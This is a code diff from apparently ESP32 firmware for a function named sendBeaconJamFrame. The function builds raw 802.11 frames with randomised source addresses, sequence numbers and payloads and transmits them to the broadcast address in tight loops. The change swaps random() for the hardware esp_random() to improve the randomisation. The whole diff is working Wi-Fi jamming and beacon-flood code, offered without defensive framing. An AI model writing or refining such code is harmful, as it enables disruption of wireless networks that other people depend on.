@@ -28,12 +28,12 @@ void sendBeaconJamFrame(const String& method) {
 
         memset(frame->addr1, 0xFF, 6);
         for (int i = 0; i < 6; i++) {
-            frame->addr2[i] = random(0, 256);
-            frame->addr3[i] = random(0, 256);
+            frame->addr2[i] = esp_random() & 0xFF;
+            frame->addr3[i] = esp_random() & 0xFF;
         }
 
-        frame->seqCtrl[0] = random(0, 256);
-        frame->seqCtrl[1] = random(0, 256);
+        frame->seqCtrl[0] = esp_random() & 0xFF;
+        frame->seqCtrl[1] = esp_random() & 0xFF;
 
         uint32_t len = sizeof(ieee80211_frame_t);
         esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, len, false);
@@ -43,13 +43,13 @@ void sendBeaconJamFrame(const String& method) {
         frame->frameCtrl[1] = 0x00;
         memset(frame->addr1, 0xFF, 6);
         for (int i = 0; i < 6; i++) {
-            frame->addr2[i] = random(0, 256);
-            frame->addr3[i] = random(0, 256);
+            frame->addr2[i] = esp_random() & 0xFF;
+            frame->addr3[i] = esp_random() & 0xFF;
         }
 
         uint8_t payload[50];
         for (int i = 0; i < 50; i++) {
-            payload[i] = random(0, 256);
+            payload[i] = esp_random() & 0xFF;
         }
 
         uint32_t frameLen = sizeof(ieee80211_frame_t);
@@ -62,8 +62,8 @@ void sendBeaconJamFrame(const String& method) {
             frame->frameCtrl[1] = 0x00;
             memset(frame->addr1, 0xFF, 6);
             for (int i = 0; i < 6; i++) {
-                frame->addr2[i] = random(0, 256);
-                frame->addr3[i] = random(0, 256);
+                frame->addr2[i] = esp_random() & 0xFF;
+                frame->addr3[i] = esp_random() & 0xFF;
             }
             esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, sizeof(ieee80211_frame_t), false);
             delayMicroseconds(50);
